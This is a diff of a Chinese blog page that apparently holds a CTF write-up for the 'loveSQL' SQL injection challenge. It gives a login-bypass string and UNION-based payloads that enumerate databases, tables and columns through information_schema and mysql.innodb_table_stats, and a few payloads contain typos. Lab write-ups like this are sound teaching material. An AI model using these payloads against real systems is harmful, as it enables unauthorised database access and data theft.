@@ -469,17 +469,55 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="1-loveSQL"><a href="#1-loveSQL" class="headerlink" title="1.loveSQL"></a>1.loveSQL</h1><p>联合查询注入</p>
-<p>（1）整体思路</p>
+                <h1 id="1-loveSQL"><a href="#1-loveSQL" class="headerlink" title="1.loveSQL"></a>1.loveSQL</h1><h4 id="（1）联合查询注入"><a href="#（1）联合查询注入" class="headerlink" title="（1）联合查询注入"></a>（1）联合查询注入</h4><p>（1）整体思路</p>
+<p>利用 information_schema</p>
+<pre><code>简单来说，这个库在mysql中就是个信息数据库，它保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。
+</code></pre>
+<p> 在注入中，infromation_schema库的作用无非就是可以获取到table_schema、table_name、column_name这些数据库内的信息。<br>————————————————<br>版权声明：本文为CSDN博主「WHOAMIAnony」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/106647880">https://blog.csdn.net/qq_45521281/article/details/106647880</a></p>
 <h5 id="观察题目提示"><a href="#观察题目提示" class="headerlink" title="观察题目提示"></a>观察题目提示</h5><p>是SQL注入</p>
-<h5 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>username或是password，分别试试字符型或数字型之类的注入类型。</p>
+<h5 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>username或是password，分别试试字符型或整型之类的注入类型。</p>
 <p>试着加一个单引号，发现</p>
-<p><img src="../images/%E5%9C%A8username%E4%B8%8A%E6%B3%A8%E5%85%A5-16369854801581.png" alt="在username上注入"></p>
-<p><img src="../images/%E5%9C%A8password%E9%87%8C%E6%B3%A8%E5%85%A5-16369854856292.png" alt="在password里注入"></p>
+<p><img src="/images/%E5%9C%A8username%E4%B8%8A%E6%B3%A8%E5%85%A5-16370658334761.png" alt="在username上注入"></p>
+<p><img src="/images/%E5%9C%A8password%E9%87%8C%E6%B3%A8%E5%85%A5-16370658441832.png" alt="在password里注入"></p>
 <p>可以发现注入点如果在password，password已经完整了，会有多余的单引号。而username的123前面只有一个单引号，可后面却有两个单引号</p>
 <p>说明我们令username=12345’ 的时候让整个sql句子里多出了一个单引号，使得句子发生报错了</p>
 <p>因此这是一道关于sql单引号闭合的题目。</p>
 <p>然后就想注释掉后面的语句，用万能钥匙usename=1’ or 1=1#</p>
+<p><img src="/images/%E4%B8%87%E8%83%BD%E9%92%A5%E5%8C%99%E7%BB%95%E8%BF%87.png" alt="万能钥匙绕过"></p>
+<p><img src="/images/%E4%B8%87%E8%83%BD%E9%92%A5%E5%8C%99%E7%BB%95%E8%BF%872.png" alt="万能钥匙绕过2"></p>
+<p>可以登录，但是还是没有flag,然后就还是按照一般步骤继续做。</p>
+<h5 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h5><p><strong>注意：此时是在url中输入的，所以不能用#，而用其url编码%23</strong>，与刚刚的那个万能钥匙不同。</p>
+<p>构造联合查询语句</p>
+<h5 id="测试显示位"><a href="#测试显示位" class="headerlink" title="测试显示位"></a>测试显示位</h5><p><img src="/images/%E6%9F%A5%E8%AF%A2%E5%88%97%E6%95%B0.png" alt="查询列数"></p>
+<h5 id=""><a href="#" class="headerlink" title=""></a></h5><p>查询当前数据库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,database(),3%23&amp;password=1</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="/images/%E5%9B%9E%E6%98%BE%E4%BD%8D.png" alt="回显位"></h5><p><img src="/images/%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="当前数据库"></p>
+<h5 id="查询表"><a href="#查询表" class="headerlink" title="查询表"></a>查询表</h5><p>/check.php?username=1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=1</p>
+<p><img src="/images/%E6%9F%A5%E8%AF%A2%E8%A1%A8.png" alt="查询表"></p>
+<p>就是这里我犯了很蠢的错，select 1,2,3 from 数据库+限制条件，语法。。。</p>
+<h5 id="查询（列名）字段（题目是lovesql-两个表中有一个长得很像，所以选择那个像的）"><a href="#查询（列名）字段（题目是lovesql-两个表中有一个长得很像，所以选择那个像的）" class="headerlink" title="查询（列名）字段（题目是lovesql,两个表中有一个长得很像，所以选择那个像的）"></a>查询（列名）字段（题目是lovesql,两个表中有一个长得很像，所以选择那个像的）</h5><p>/check.php?username=1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’l0ve1ysq1’%23&amp;password=1</p>
+<h5 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="/images/%E6%9F%A5%E8%AF%A2%E5%88%97.png" alt="查询列"></h5><h5 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h5><p><img src="/images/%E6%9F%A5%E8%AF%A2%E5%86%85%E5%AE%B9.png" alt="查询内容"></p>
+<p><img src="/images/f12%E8%B0%83%E5%87%BA.png" alt="f12调出"></p>
+<p><img src="/images/%E6%8B%BF%E5%88%B0flag.png" alt="拿到flag"></p>
+<h5 id="（2）无列名注入"><a href="#（2）无列名注入" class="headerlink" title="（2）无列名注入"></a>（2）无列名注入</h5><p>【mysql】在被waf禁掉了information_schema库后还能有哪些利用思路,类似的表还有：<a target="_blank" rel="noopener" href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">mysql.innodb_table_stats</a>、mysql.innodb_table_index都存放有库名表名。</p>
+<p>整体思路：</p>
+<p>先判断注入点，注入类型，再看列数，然后无列名就不能用informtion_schema这个库了，换成mysql.innodb_table_starts,可以查出数据库与表名，查不出字段。</p>
+<p>查询库</p>
+<p>先用常规联合查询 username=1’ union slect 1,database(),3%23</p>
+<p>查询表</p>
+<p>mysql.innodb_table_stats</p>
+<p>-1’union select 1，(select group_concat(table_name) from mysql.innodb_table_stats),3–+</p>
+<p><img src="/images/%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="查询数据库"></p>
+<p>查询字段名</p>
+<p>username=1’ union select 1,(select 1 union select from 10ve1ysq1),3#，测试表中有几列数据</p>
+<p><img src="../images/%E6%B5%8B%E8%AF%95%E8%A1%A8%E9%87%8C%E7%9A%84%E5%88%97%E6%95%B0.png" alt="测试表里的列数"></p>
+<p>直到测到username=1’ union select 1,(select 1,2,3 union select* from l0ve1ysq1),3%23&amp;password=1234，一共有三列。</p>
+<p><img src="../images/%E4%B8%89%E5%88%97.png" alt="三列"></p>
+<p>查询数据</p>
+<p>字段的名字不清楚，所以用别名代替。</p>
+<p><img src="/images/%E6%88%90%E5%8A%9F%E4%BA%86.png" alt="成功了"></p>
+<p><img src="/images/%E6%9F%A5%E7%9C%8B%E5%8D%B3%E5%8F%AF.png" alt="查看即可"></p>
 
                 
             </div>
